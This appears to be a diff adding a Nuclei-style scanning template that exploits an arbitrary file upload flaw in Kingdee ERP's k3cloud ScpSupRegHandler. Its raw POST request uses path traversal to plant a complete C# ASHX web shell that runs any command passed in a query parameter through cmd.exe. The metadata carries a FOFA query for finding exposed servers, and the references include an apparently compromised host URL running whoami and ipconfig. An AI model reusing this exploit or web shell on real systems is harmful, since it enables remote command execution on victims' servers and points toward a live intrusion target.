@@ -1,0 +1,90 @@
+id: kingdee-erp-file_upload
+
+info:
+  name: kingdee-erp-file_upload
+  author: vitasoy
+  severity: critical
+  description: Kingdee ERP has a kingdee-erp-file_upload vulnerability. 
+  reference: |
+    https://github.com/yuziiiiiiiiii/Kingdee_k3cloud-ScpSupRegHandler-Upload-POC
+    https://peiqi.wgpsec.org/wiki/oa/%E9%87%91%E8%9D%B6OA/%E9%87%91%E8%9D%B6OA%20%E4%BA%91%E6%98%9F%E7%A9%BA%20ScpSupRegHandler%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+    https://github.com/yangbaopeng/ashx_webshell/blob/master/shell.ashx
+    http://124.71.115.20/k3cloud/uploadfiles/test.ashx?cmd=whoami%26%26ipconfig
+  tags: kingdee-erp
+  metadata: 
+    fofa-query: icon_hash="-1629133697" && title=="金蝶云星空"
+
+variables:
+  a1: "test.ashx."
+
+http:
+  - raw:
+      - |
+        POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: multipart/form-data; boundary=2ac719f8e29343df94aa4ab49e456061
+        Content-Length: 371
+
+        --2ac719f8e29343df94aa4ab49e456061
+        Content-Disposition: form-data; name="dbId_v"
+
+        .
+        --2ac719f8e29343df94aa4ab49e456061
+        Content-Disposition: form-data; name="FID"
+
+        2023
+        --2ac719f8e29343df94aa4ab49e456061
+        Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/{{a1}}"Content-Type: text/plain
+
+        <% @ webhandler language="C#" class="AverageHandler" %>
+
+        using System;
+        using System.Web;
+        using System.Diagnostics;
+        using System.IO;
+
+        public class AverageHandler : IHttpHandler
+        {
+          /* .Net requires this to be implemented */
+          public bool IsReusable
+          {
+            get { return true; }
+          }
+
+          /* main executing code */
+          public void ProcessRequest(HttpContext ctx)
+          {
+            Uri url = new Uri(HttpContext.Current.Request.Url.Scheme + "://" +   HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);
+            string command = HttpUtility.ParseQueryString(url.Query).Get("cmd");
+
+            ctx.Response.Write("<form method='GET'>Command: <input name='cmd' value='"+command+"'><input type='submit' value='Run'></form>");
+            ctx.Response.Write("<hr>");
+            ctx.Response.Write("<pre>");
+
+            /* command execution and output retrieval */
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = "cmd.exe";
+            psi.Arguments = "/c "+command;
+            psi.RedirectStandardOutput = true;
+            psi.UseShellExecute = false;
+            Process p = Process.Start(psi);
+            StreamReader stmrdr = p.StandardOutput;
+            string s = stmrdr.ReadToEnd();
+            stmrdr.Close();
+
+            ctx.Response.Write(System.Web.HttpUtility.HtmlEncode(s));
+            ctx.Response.Write("</pre>");
+            ctx.Response.Write("<hr>");
+         }
+        }
+        --2ac719f8e29343df94aa4ab49e456061--
+
+    matchers:
+      - type: word
+        words:
+          - "\"IsSuccess\": true"
+        part: body
